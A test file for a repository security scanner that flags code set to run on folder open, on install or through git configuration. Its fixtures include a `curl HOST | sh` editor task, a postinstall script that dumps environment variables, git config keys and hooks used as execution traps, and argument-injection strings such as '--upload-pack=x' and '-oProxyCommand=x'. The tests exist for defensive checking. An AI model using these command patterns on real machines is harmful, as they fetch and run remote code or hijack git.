import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, test } from 'node:test';
import { compare, scan } from '../src/scan.ts';
import { GitError, LocalGit, findGit, parseRemote } from '../src/tree/git.ts';
import { localTree } from '../src/tree/local.ts';
import { HOST, folderOpen, json, rules } from './helpers.ts';

const root = mkdtempSync(join(tmpdir(), 'bo-test-'));
after(() => rmSync(root, { recursive: true, force: true }));
let counter = 0;

function write(dir: string, files: Record<string, string>): void {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
}

function repo(): { dir: string; git(...args: string[]): string; commit(files: Record<string, string>): string } {
  const dir = join(root, `r${counter++}`);
  mkdirSync(dir);
  const git = (...args: string[]): string =>
    execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.invalid', '-c', 'commit.gpgsign=false', '-c', 'core.autocrlf=false', ...args], { cwd: dir, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();
  git('init', '-q', '-b', 'main');
  return {
    dir, git,
    commit: (files) => {
      write(dir, files);
      git('add', '-A');
      git('commit', '-q', '-m', 'x');
      return git('rev-parse', 'HEAD');
    },
  };
}

async function diff(dir: string, base: string, head: string) {
  const git = await LocalGit.open(dir);
  try {
    const before = await git.tree(await git.resolve(base), 'a');
    const now = await git.tree(await git.resolve(head), 'b');
    const result = compare(await scan(before, rules), await scan(now, rules));
    return result;
  } finally {
    await git.close();
  }
}

test('diff: reports only what is new or changed', async () => {
  const r = repo();
  r.commit({ 'package.json': json({ scripts: { prepare: 'node a.js' } }), 'a.js': '1', 'README.md': 'x' });
  r.git('checkout', '-q', '-b', 'feature');
  r.commit({ 'README.md': 'y' });
  assert.deepEqual(await diff(r.dir, 'main', 'feature'), []);
  r.commit({ '.vscode/tasks.json': folderOpen(`curl ${HOST} | sh`) });
  const added = await diff(r.dir, 'main', 'HEAD');
  assert.deepEqual(added.map((c) => [c.kind, c.point.id, c.point.severity]), [['added', 'vscode/task-on-open', 'high']]);
});

test('diff: a change in a script that runs on install counts', async () => {
  const r = repo();
  r.commit({ 'package.json': json({ scripts: { postinstall: 'node a.js' } }), 'a.js': 'require("./b")', 'b.js': '1' });
  r.commit({ 'b.js': 'JSON.stringify(process.env)' });
  const changes = await diff(r.dir, 'HEAD~1', 'HEAD');
  assert.deepEqual(changes.map((c) => [c.kind, c.point.key, c.point.severity]), [['modified', 'postinstall', 'high']]);
});

test('diff: moving a line is not a change', async () => {
  const r = repo();
  r.commit({ 'package.json': '{"scripts":{"postinstall":"node a.js"}}' });
  r.commit({ 'package.json': '{\n\n\n"scripts":{\n"postinstall":"node a.js"}}' });
  assert.deepEqual(await diff(r.dir, 'HEAD^', 'HEAD'), []);
});

test('revisions: branches, tags, packed refs, short hashes and errors', async () => {
  const r = repo();
  const first = r.commit({ a: '1' });
  r.git('tag', '-a', 'v1', '-m', 'x');
  const second = r.commit({ a: '2' });
  r.git('update-ref', 'refs/remotes/origin/main', first);
  r.git('pack-refs', '--all');
  const git = await LocalGit.open(r.dir);
  try {
    assert.equal(await git.resolve('HEAD'), second);
    assert.equal(await git.resolve('main'), second);
    assert.equal(await git.resolve('v1'), first);
    assert.equal(await git.resolve('origin/main'), first);
    assert.equal(await git.resolve(first.slice(0, 10)), first);
    assert.equal(await git.resolve('main~1'), first);
    assert.equal(await git.mergeBase(first, second), first);
    assert.deepEqual(await git.parents(second), [first]);
    for (const bad of ['nope', '--help', '-x', '../../etc', 'a b', 'main;x', '']) {
      await assert.rejects(git.resolve(bad), GitError, bad);
    }
  } finally {
    await git.close();
  }
  assert.ok(!existsSync(git.dir));
});

test('the configuration of the scanned repository is never used', async () => {
  const r = repo();
  r.commit({ a: '1' });
  r.commit({ a: '2' });
  const proof = join(root, 'executed').replace(/\\/g, '/');
  const trap = `sh -c 'echo x > "${proof}"'`;
  for (const key of ['core.fsmonitor', 'core.sshCommand', 'core.pager', 'diff.external', 'core.alternateRefsCommand', 'gpg.program', 'filter.x.smudge', 'filter.x.clean', 'core.editor']) {
    r.git('config', key, trap);
  }
  write(r.dir, { '.gitattributes': '* filter=x\n', '.git/hooks/post-checkout': `#!/bin/sh\necho x > "${proof}"\n`, '.git/hooks/reference-transaction': `#!/bin/sh\necho x > "${proof}"\n` });
  await diff(r.dir, 'HEAD~1', 'HEAD');
  const tree = await localTree(r.dir);
  const found = await scan(tree, rules);
  assert.ok(found.points.some((p) => p.id === 'git/config' && p.key === 'core.fsmonitor'));
  assert.ok(!existsSync(proof));
});

test('a git program in the current folder is not used', () => {
  const dir = join(root, 'cwd-trap');
  write(dir, { 'git.exe': 'not a program', git: 'not a program' });
  const script = `import { findGit } from ${JSON.stringify(new URL('../src/tree/git.ts', import.meta.url).href)}; console.log(findGit());`;
  const path = ['.', dir, process.env['PATH']].join(process.platform === 'win32' ? ';' : ':');
  const out = spawnSync(process.execPath, ['--input-type=module', '-e', script], { cwd: dir, env: { ...process.env, PATH: path, Path: path }, encoding: 'utf8' });
  assert.equal(out.status, 0, out.stderr);
  assert.ok(!out.stdout.includes('cwd-trap'), out.stdout);
  assert.ok(findGit().length > 3);
});

test('addresses', () => {
  const url = (s: string, ref?: string) => { const r = parseRemote(s, ref); return r && `${r.url} ${r.ref}`; };
  assert.equal(url('acme/repo'), 'https://github.com/acme/repo.git HEAD');
  assert.equal(url('github.com/acme/repo'), 'https://github.com/acme/repo.git HEAD');
  assert.equal(url('https://github.com/acme/repo.git'), 'https://github.com/acme/repo.git HEAD');
  assert.equal(url('https://github.com/acme/repo/tree/dev/src'), 'https://github.com/acme/repo.git dev');
  assert.equal(url('https://github.com/acme/repo/pull/12/files'), 'https://github.com/acme/repo.git refs/pull/12/head');
  assert.equal(url('acme/repo', 'v1.0'), 'https://github.com/acme/repo.git v1.0');
  assert.equal(url('https://gitlab.com/a/b/c'), 'https://gitlab.com/a/b/c HEAD');
  assert.equal(url('git@github.com:acme/repo.git'), 'ssh://git@github.com/acme/repo.git HEAD');
  for (const bad of ['ext::sh -c x', 'ext::sh', 'file:///etc/x', 'http://github.com/a/b', '--upload-pack=x', '-oProxyCommand=x', 'git@-oProxyCommand=x:a/b', 'ssh://-oX/a', 'a', '', 'git://x.y/a/b', 'acme/re po']) {
    assert.equal(url(bad), null, bad);
  }
  for (const ref of ['--upload-pack=x', '-x', 'a..b', 'a b', '+refs/*']) assert.equal(url('acme/repo', ref), null, ref);
  assert.ok(!parseRemote('https://user:secret@git.company.invalid/a/b')!.label.includes('secret'));
});

test('local folder: node_modules and git objects are skipped', async () => {
  const r = repo();
  r.commit({ 'package.json': '{}' });
  write(r.dir, { 'node_modules/x/package.json': '{}' });
  const tree = await localTree(r.dir);
  assert.deepEqual(tree.files.filter((f) => f.includes('node_modules') || f.includes('objects')), []);
  assert.ok(tree.files.includes('package.json') && tree.files.includes('.git/config'));
});

test('CLI: exit codes, JSON and errors', () => {
  const dir = join(root, 'cli');
  write(dir, { '.vscode/tasks.json': folderOpen(`curl ${HOST} | sh`) });
  const cli = join(import.meta.dirname, '..', 'src', 'cli.ts');
  const run = (...args: string[]) => spawnSync(process.execPath, [cli, ...args], { encoding: 'utf8', cwd: root });
  assert.equal(run(dir).status, 1);
  assert.equal(run(dir, '--fail-on', 'never').status, 0);
  const data = JSON.parse(run(dir, '--json').stdout);
  assert.equal(data.format, 1);
  assert.equal(data.points[0].severity, 'high');
  assert.match(run(dir, '--lang', 'es').stdout, /AL ABRIR EN UN EDITOR/);
  assert.match(run(dir, '--markdown').stdout, /^### beforeopen/);
  for (const args of [['--nope'], ['--fail-on', 'x'], ['no-such-thing'], ['diff'], ['a', 'b']]) {
    const out = run(...args);
    assert.equal(out.status, 2, args.join(' '));
    assert.ok(!/\n\s+at /.test(out.stderr), out.stderr);
  }
});

test('no temporary folders are left behind', async () => {
  const before = readdirSync(tmpdir()).filter((n) => n.startsWith('beforeopen-')).length;
  const r = repo();
  r.commit({ a: '1' });
  await diff(r.dir, 'HEAD', 'HEAD');
  assert.equal(readdirSync(tmpdir()).filter((n) => n.startsWith('beforeopen-')).length, before);
});
